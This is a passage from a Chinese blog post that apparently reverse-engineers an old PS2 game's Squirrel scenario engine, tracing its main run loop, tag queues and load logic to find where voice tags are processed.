class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * メインロジック</span><br><span class="line"> */</span><br><span class="line">function run()    &#123;</span><br><span class="line">    local obj;</span><br><span class="line">    for(;;)    &#123;</span><br><span class="line"></span><br><span class="line">        // ロード復帰処理</span><br><span class="line">        if (targetPage != null) &#123;</span><br><span class="line">            // ...</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (pendings.len() &gt; 0) &#123;</span><br><span class="line">            // 後回しにされたタグがある場合</span><br><span class="line">            obj = pendings[0];</span><br><span class="line">            pendings.remove(0);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 表示テキストがある場合の処理</span><br><span class="line">            if (currentText.len() &gt; 0) &#123;</span><br><span class="line">//                    if (isSkip()) &#123;</span><br><span class="line">//                        obj = &#123;tagname=&quot;ch2&quot;, text=currentText&#125;;</span><br><span class="line">//                        currentText = &quot;&quot;;</span><br><span class="line">//                    &#125; else &#123;</span><br><span class="line">                    if (iskanji(currentText)) &#123;</span><br><span class="line">                        local ch = currentText.slice(0,2);</span><br><span class="line">                        currentText = currentText.slice(2);</span><br><span class="line">                        obj = &#123;tagname=&quot;ch2&quot;, text=ch&#125;;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        local ch = currentText.slice(0,1);</span><br><span class="line">                        currentText = currentText.slice(1);</span><br><span class="line">                        obj = &#123;tagname=&quot;ch2&quot;, text=ch&#125;;</span><br><span class="line">                    &#125;</span><br><span class="line">//                    &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                if (cur &lt; lines.len()) &#123;</span><br><span class="line">                    obj = lines[cur++];</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    obj = null;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (obj == null) &#123;</span><br><span class="line">            // シナリオ終了</span><br><span class="line">            //dm(&quot; シナリオ終了 cur:&quot; + curStorage + &quot; next:&quot; + nextStorage) ;</span><br><span class="line">            local next = nextStorage;</span><br><span class="line">            if (next == null || next == 0) &#123;</span><br><span class="line">                next = getNextScene(curStorage);</span><br><span class="line">            &#125;                    </span><br><span class="line">            dm(&quot;next:&quot; + next);</span><br><span class="line">            if (next != null &amp;&amp; next != &quot;&quot; &amp;&amp; next != 0) &#123;</span><br><span class="line">                goToNext(next);</span><br><span class="line">                continue;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                status = STOP;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (obj.tagname == &quot;label&quot;) &#123; // ラベル処理</span><br><span class="line">            if (targetPage != null) &#123;</span><br><span class="line">                if (targetBranches.len() &gt; 0) &#123;</span><br><span class="line">                    if (obj.count != targetBranches[0]) &#123;</span><br><span class="line">                        goToCount(targetBranches[0]);</span><br><span class="line">                        continue;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        targetBranches.remove(0);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    // XXX ロード失敗</span><br><span class="line">                    dm(&quot; ロード失敗: ラベルの整合不良 &quot;);</span><br><span class="line">                    status = STOP;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            setReaded(curPage);    // 次のラベルに進む前に最後の行の既読をたてる</span><br><span class="line">            curCount = obj.count;</span><br><span class="line">            branches.append(curCount);</span><br><span class="line">            curPage = 0;</span><br><span class="line">            savePrepare();</span><br><span class="line">            continue;</span><br><span class="line">        &#125; else if (obj.tagname == &quot;begintrans&quot;) &#123;</span><br><span class="line">            //dm(&quot; 全体トランジションを処理 &quot;);</span><br><span class="line">            obj = null;</span><br><span class="line">            while (cur &lt; lines.len() &amp;&amp; (obj = lines[cur++]) != null &amp;&amp; obj.tagname != &quot;endtrans&quot;) &#123;</span><br><span class="line">                if (obj.tagname == &quot;begintrans&quot;) &#123;</span><br><span class="line">                    throw &quot;begintrans は入れ子にできません &quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                pendings.append(obj);</span><br><span class="line">            &#125;</span><br><span class="line">            if (obj == null) &#123;</span><br><span class="line">                throw &quot;begintrans に対応する endtrans がありません &quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            if (!isJump()) &#123;</span><br><span class="line">                local trans = null;</span><br><span class="line">                foreach (cmd, param in obj) &#123;</span><br><span class="line">                    if (cmd == &quot;tagname&quot;) &#123;</span><br><span class="line">                        // ignore</span><br><span class="line">                    &#125; else if (cmd == &quot;trans&quot;) &#123;</span><br><span class="line">                        local tr = getTrans(param, obj);</span><br><span class="line">                        if (tr != null) &#123;</span><br><span class="line">                            trans = tr;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; else if (cmd == &quot;fade&quot;) &#123;</span><br><span class="line">                        local time = param.tointeger();</span><br><span class="line">                        trans = &#123;</span><br><span class="line">                            method = &quot;crossfade&quot;,</span><br><span class="line">                            time = time &gt; 1 ? time : env.getFadeValue(),</span><br><span class="line">                        &#125;;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        local tr = getTrans(cmd, obj);</span><br><span class="line">                        if (tr != null) &#123;</span><br><span class="line">                            trans = tr;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                if (trans != null &amp;&amp; &quot;msgoff&quot; in trans) &#123;</span><br><span class="line">                    insertTag(&quot;msgoff&quot;, null);</span><br><span class="line">                &#125;</span><br><span class="line">                if (trans != null &amp;&amp; getval(trans, &quot;method&quot;) == &quot;layer&quot;) &#123;</span><br><span class="line">                    insertTag(&quot;_beginlt&quot;, trans);</span><br><span class="line">                    local e = &#123;&#125;;</span><br><span class="line">                    if (&quot;transwait&quot; in trans) &#123;</span><br><span class="line">                        e.wait &lt;- getint(trans, &quot;transwait&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (&quot;endtime&quot; in trans) &#123;</span><br><span class="line">                        e.time &lt;- getint(trans, &quot;endtime&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (&quot;endtype&quot; in trans) &#123;</span><br><span class="line">                        e.type &lt;- getval(trans, &quot;endtype&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (&quot;endrule&quot; in trans) &#123;</span><br><span class="line">                        e.rule &lt;- getval(trans, &quot;endrule&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    addTag(&quot;_endlt&quot;, e);</span><br><span class="line">                &#125; else if (trans != null) &#123;</span><br><span class="line">                    insertTag(&quot;_begintrans&quot;, null);</span><br><span class="line">                    addTag(&quot;_endtrans&quot;, &#123;trans=trans&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            continue;</span><br><span class="line">        &#125; else if (obj.tagname == &quot;ch&quot;) &#123;</span><br><span class="line">            doText(obj.text);</span><br><span class="line">            continue;</span><br><span class="line">        &#125; else if (obj.tagname == &quot;embex&quot;) &#123; // 変数埋め込みの参照</span><br><span class="line">            if (&quot;exp&quot; in obj) &#123;</span><br><span class="line">                local text = ::eval(obj.exp);</span><br><span class="line">                if (typeof text == &quot;string&quot;) &#123;</span><br><span class="line">                    doText(text);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            continue;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // その他のコマンド</span><br><span class="line">            </span><br><span class="line">            // 実行時判定される cond</span><br><span class="line">            if (&quot;condex&quot; in obj) &#123;</span><br><span class="line">                if (!::eval(obj.condex)) &#123;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                //delete obj.condex;</span><br><span class="line">            &#125; else if (&quot;if&quot; in obj) &#123;</span><br><span class="line">                if (!::eval(obj[&quot;if&quot;])) &#123;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                //delete obj[&quot;if&quot;];</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            // onTag を呼ぶ</span><br><span class="line">            local step = onTag(obj);</span><br><span class="line">            if (step == null) &#123;</span><br><span class="line">                throw &quot;onTag が null を返しました (&quot; + obj.tagname + &quot;)&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            step = step.tointeger(); // step を数値に</span><br><span class="line">            //dm(obj.tagname + &quot; タグ戻り値:&quot; + step);</span><br><span class="line">            </span><br><span class="line">            if (step == 0) &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            if (step &lt; 0) &#123;</span><br><span class="line">                switch(step) &#123;</span><br><span class="line">                case -5: // いったんイベントを処理(現在のタグは後回し)</span><br><span class="line">                    pendings.insert(0, obj);</span><br><span class="line">                    return;</span><br><span class="line">                case -4: // いったんイベントを処理</span><br><span class="line">                    return;</span><br><span class="line">                case -3: // 後回ししてブレーク</span><br><span class="line">                    pendings.insert(0, obj);</span><br><span class="line">                    updateBeforeCh = 1;</span><br><span class="line">                    return;</span><br><span class="line">                case -2: // ブレーク</span><br><span class="line">                    updateBeforeCh = 1;</span><br><span class="line">                    return;</span><br><span class="line">                case -1: // シナリオ終了</span><br><span class="line">                    status = STOP;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                waitTime(step, false);</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数是一个巨大的无限循环 <code>for(;;)</code>，但是看起来循环存在多种退出逻辑，因此不一定是游戏主循环，根据类以及函数注释，该函数很有可能是一个场景下的的主要处理逻辑。</p><p>分析一下这个函数的逻辑，主要从 <code>onTag</code> 那一行开始看起，<code>onTag</code> 的参数 <code>elm</code> 也就是该函数中的 <code>obj</code>，在调用 <code>onTag</code> 前都是在生成 <code>obj</code>，之后调用 <code>onTag</code> 处理 <code>obj</code>，之后返回一个 <code>step</code> 来决定循环是否继续或者直接退出。</p><p>在大循环中，首先判断了一下 <code>targetPage</code>，根据游戏经验以及注释，这个 if 分支可能是快速推进剧本到 <code>targetPage</code>，也就是实现快进功能。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// ロード復帰処理</span><br><span class="line">if (targetPage != null) &#123;</span><br><span class="line">    if (targetBranches.len() == 0 &amp;&amp; curPage &gt;= targetPage) &#123;</span><br><span class="line">        dm(&quot; ジャンプ終了 &quot;);</span><br><span class="line">        savePrepare();</span><br><span class="line">        showVariables(variables, VAR_GAME);</span><br><span class="line">        targetPage = null;</span><br><span class="line">        // 画面復帰処理</span><br><span class="line">        insertTag(&quot;_endlt&quot;, &#123;time=1000&#125;);</span><br><span class="line">        insertTag(&quot;_sync&quot;, null);</span><br><span class="line">        // すぐマスク</span><br><span class="line">        beginLayerTrans(&#123;time=0&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后就是 <code>obj</code> 的生成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">if (pendings.len() &gt; 0) &#123;</span><br><span class="line">    // 後回しにされたタグがある場合</span><br><span class="line">    obj = pendings[0];</span><br><span class="line">    pendings.remove(0);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    // 表示テキストがある場合の処理</span><br><span class="line">    if (currentText.len() &gt; 0) &#123;</span><br><span class="line">//        if (isSkip()) &#123;</span><br><span class="line">//            obj = &#123;tagname=&quot;ch2&quot;, text=currentText&#125;;</span><br><span class="line">//            currentText = &quot;&quot;;</span><br><span class="line">//        &#125; else &#123;</span><br><span class="line">            if (iskanji(currentText)) &#123;</span><br><span class="line">                local ch = currentText.slice(0,2);</span><br><span class="line">                currentText = currentText.slice(2);</span><br><span class="line">                obj = &#123;tagname=&quot;ch2&quot;, text=ch&#125;;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                local ch = currentText.slice(0,1);</span><br><span class="line">                currentText = currentText.slice(1);</span><br><span class="line">                obj = &#123;tagname=&quot;ch2&quot;, text=ch&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">//        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if (cur &lt; lines.len()) &#123;</span><br><span class="line">            obj = lines[cur++];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            obj = null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 <code>pendings</code> 队列非空则直接获取队首，否则生成新的，这里我们先关注生成。首先判断了 <code>currentText</code> 是否有值，根据变量名猜测这个可能就是当前要播放的文字，注释说该 if 分支表示“有显示文本时的处理”，在游戏大部分时候肯定都是有文字显示，那么进入该分支的频率可能会非常高。</p><p>如果 <code>currentText</code> 有值，则先判断 <code>iskanji</code>，日语中 kanji 是汉字的意思，实际上这里就是判断是否需要采用双字节编码。不管是否属于汉字，都将 <code>currentText</code> 的第一个字符切下来保存在 <code>obj.text</code> 中，<code>currentText</code> 保存剩下的，而此时 <code>tagname</code> 为 <code>ch2</code>也就是回调函数 <code>tag_ch</code>，很明显这不是我们想要的回调函数。如果 <code>currentText</code> 没有值，那么 <code>obj</code> 就可能会在 else 分支中来自 <code>lines</code> 数组，或者为 <code>null</code>。</p><p>看一下 <code>iskanji</code> 函数发现其实这里是将前一个句子结尾的标点符号截取出来，因此这里 <code>obj</code> 仅是为了处理一个标点字符而生成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// 行頭禁則</span><br><span class="line">kinsokuText &lt;- &#123;</span><br><span class="line">    [&quot;。&quot;] = true,</span><br><span class="line">    [&quot;，&quot;] = true,</span><br><span class="line">    [&quot;、&quot;] = true,</span><br><span class="line">    [&quot;．&quot;] = true,</span><br><span class="line">    [&quot;：&quot;] = true,</span><br><span class="line">    [&quot;；&quot;] = true,</span><br><span class="line">    [&quot; ゛ &quot;] = true,</span><br><span class="line">    [&quot; ゜ &quot;] = true,</span><br><span class="line">    [&quot; ヽ &quot;] = true,</span><br><span class="line">    [&quot; ヾ &quot;] = true,</span><br><span class="line">    [&quot; ゝ &quot;] = true,</span><br><span class="line">    [&quot; ゞ &quot;] = true,</span><br><span class="line">    [&quot;々&quot;] = true,</span><br><span class="line">    [&quot;’&quot;] = true,</span><br><span class="line">    [&quot;”&quot;] = true,</span><br><span class="line">    [&quot;）&quot;] = true,</span><br><span class="line">    [&quot;〕&quot;] = true,</span><br><span class="line">    [&quot;］&quot;] = true,</span><br><span class="line">    [&quot;｝&quot;] = true,</span><br><span class="line">    [&quot;〉&quot;] = true,</span><br><span class="line">    [&quot;》&quot;] = true,</span><br><span class="line">    [&quot;」&quot;] = true,</span><br><span class="line">    [&quot;』&quot;] = true,</span><br><span class="line">    [&quot;】&quot;] = true,</span><br><span class="line">    [&quot;°&quot;] = true,</span><br><span class="line">    [&quot;′&quot;] = true,</span><br><span class="line">    [&quot;″&quot;] = true,</span><br><span class="line">    [&quot;℃&quot;] = true,</span><br><span class="line">    [&quot;￠&quot;] = true,</span><br><span class="line">    [&quot;％&quot;] = true,</span><br><span class="line">    [&quot;‰&quot;] = true,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function isKinsoku(ch)</span><br><span class="line">&#123;</span><br><span class="line">    return ch in kinsokuText;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着往下看 <code>obj</code> 为 <code>null</code> 会被如何处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">if (obj == null) &#123;</span><br><span class="line">    // シナリオ終了</span><br><span class="line">    //dm(&quot; シナリオ終了 cur:&quot; + curStorage + &quot; next:&quot; + nextStorage) ;</span><br><span class="line">    local next = nextStorage;</span><br><span class="line">    if (next == null || next == 0) &#123;</span><br><span class="line">        next = getNextScene(curStorage);</span><br><span class="line">    &#125;                    </span><br><span class="line">    dm(&quot;next:&quot; + next);</span><br><span class="line">    if (next != null &amp;&amp; next != &quot;&quot; &amp;&amp; next != 0) &#123;</span><br><span class="line">        goToNext(next);</span><br><span class="line">        continue;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        status = STOP;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据注释，如果 <code>obj</code> 为 <code>null</code>，那么代表剧本结束，进入下一个场景，因此当需要播放声音时，<code>obj</code> 不应该为 <code>null</code>。在往下看 obj 如何被处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">if (obj.tagname == &quot;label&quot;) &#123; // ラベル処理</span><br><span class="line">    // ...</span><br><span class="line">&#125; else if (obj.tagname == &quot;begintrans&quot;) &#123;</span><br><span class="line">    // ...</span><br><span class="line">&#125; else if (obj.tagname == &quot;ch&quot;) &#123;</span><br><span class="line">    doText(obj.text);</span><br><span class="line">    continue;</span><br><span class="line">&#125; else if (obj.tagname == &quot;embex&quot;) &#123; // 変数埋め込みの参照</span><br><span class="line">    if (&quot;exp&quot; in obj) &#123;</span><br><span class="line">        local text = ::eval(obj.exp);</span><br><span class="line">        if (typeof text == &quot;string&quot;) &#123;</span><br><span class="line">            doText(text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    continue;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    // その他のコマンド</span><br><span class="line">    </span><br><span class="line">    // 実行時判定される cond</span><br><span class="line">    if (&quot;condex&quot; in obj) &#123;</span><br><span class="line">        if (!::eval(obj.condex)) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        //delete obj.condex;</span><br><span class="line">    &#125; else if (&quot;if&quot; in obj) &#123;</span><br><span class="line">        if (!::eval(obj[&quot;if&quot;])) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        //delete obj[&quot;if&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // onTag を呼ぶ</span><br><span class="line">    local step = onTag(obj);</span><br><span class="line">    if (step == null) &#123;</span><br><span class="line">        throw &quot;onTag が null を返しました (&quot; + obj.tagname + &quot;)&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    step = step.tointeger(); // step を数値に</span><br><span class="line">    // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后在调用 <code>onTag</code> 前并没有生成新的 <code>obj</code>，那么到此为止生成的 <code>obj</code> 只是为了处理 <code>currentText</code> 开头的标点，则其他的 <code>obj</code> 只能来自类的静态变量 <code>pendings</code> 队列或者 <code>lines</code> 数组。首先看看 <code>pendings</code> 从哪里来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * タグ割り込み処理</span><br><span class="line"> */</span><br><span class="line">function addTag(name, elm) &#123;</span><br><span class="line">    local e;</span><br><span class="line">    if (elm != null) &#123;</span><br><span class="line">        e = clone elm;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        e = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    if (name != null) &#123;</span><br><span class="line">        e.tagname &lt;- name;</span><br><span class="line">    &#125;</span><br><span class="line">    pendings.append(e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * タグ割り込み処理</span><br><span class="line"> */</span><br><span class="line">function insertTag(name, elm) &#123;</span><br><span class="line">    local e;</span><br><span class="line">    if (elm != null) &#123;</span><br><span class="line">        e = clone elm;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        e = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    if (name != null) &#123;</span><br><span class="line">        e.tagname &lt;- name;</span><br><span class="line">    &#125;</span><br><span class="line">    pendings.insert(0, e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>run</code> 循环中的 <code>pendings</code> 主要添加的是已有的 <code>obj</code>，因此 <code>pendings</code> 的其他值只能通过函数 <code>addTag</code> 以及 <code>insertTag</code> 添加。这两个函数都会添加一个 <code>elm</code>，也就是 <code>obj</code>，并且将 <code>name</code> 作为 <code>tagname</code>，所以接下来找找哪些地方调用了这些函数。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/19.jpg" alt="insertTag 搜索结果"></p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/20.jpg" alt="addTag 搜索结果"></p><p>很可惜，在所有的搜索结果中，没有找到调用 <code>entryvoice</code> 以及 <code>dispname</code> 的代码，因此 <code>pendings</code> 并不是我们的目标，那么来看看 <code>lines</code>。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/21.jpg" alt="lines 搜索结果"></p><p><code>lines</code>并没有写值操作，但是有赋值操作 <code>lines = getScene(curStorage)</code>，都是在 <code>28_43000_d330.nut</code> 中.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 実行開始</span><br><span class="line"> * @param storage 開始シナリオ</span><br><span class="line"> * @param option パース用オプション</span><br><span class="line"> */</span><br><span class="line">function start(storage) &#123;</span><br><span class="line">    dm(&quot; シーン再生開始 &quot;);</span><br><span class="line">    clearForStart();</span><br><span class="line">    curStorage = storage;</span><br><span class="line">    lines = getScene(curStorage);</span><br><span class="line">    </span><br><span class="line">    prevSkipMode = null;</span><br><span class="line">    currentText = &quot;&quot;;</span><br><span class="line">    status = RUN;</span><br><span class="line">    // 初期変数保存</span><br><span class="line">    savef = clone f;</span><br><span class="line">    savePrepare();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * ロード処理</span><br><span class="line"> * ゲーム変数からシナリオ状態変数を読み込んでから実行開始</span><br><span class="line"> */</span><br><span class="line">function load() &#123;</span><br><span class="line">    dm(&quot; シーンロード開始 &quot;);</span><br><span class="line">    clearForStart();</span><br><span class="line">    </span><br><span class="line">    if (savef.storage != &quot;&quot;) &#123;</span><br><span class="line">        dm(&quot; ロード対象:&quot; + savef.storage);</span><br><span class="line">        dm(&quot; ロードまでの分岐数:&quot; + savef.branchCount);</span><br><span class="line">        dm(&quot; ロード先:&quot; + savef.targetPage);</span><br><span class="line">        curStorage = savef.storage;</span><br><span class="line">        lines = getScene(curStorage);</span><br><span class="line">        if (lines == null) &#123;</span><br><span class="line">            dm(&quot; ロード失敗 &quot;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        // 分岐情報復帰</span><br><span class="line">        for (local i=0;i&lt;savef.branchCount;i++) &#123;</span><br><span class="line">            targetBranches.append(savef[&quot;branch&quot;+i]);</span><br><span class="line">            //dm(&quot; 分岐:&quot; + savef[&quot;branch&quot;+i]);</span><br><span class="line">        &#125;</span><br><span class="line">        // ページ番号復帰</span><br><span class="line">        targetPage = savef.targetPage;</span><br><span class="line">        // 変数復帰</span><br><span class="line">        f = clone savef;</span><br><span class="line">        // 時間復帰</span><br><span class="line">        currentTick = savef.time;</span><br><span class="line">        prevSkipMode = null;</span><br><span class="line">        currentText = &quot;&quot;;</span><br><span class="line">        status = RUN;</span><br><span class="line">        return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        dm(&quot; ロード失敗 &quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span 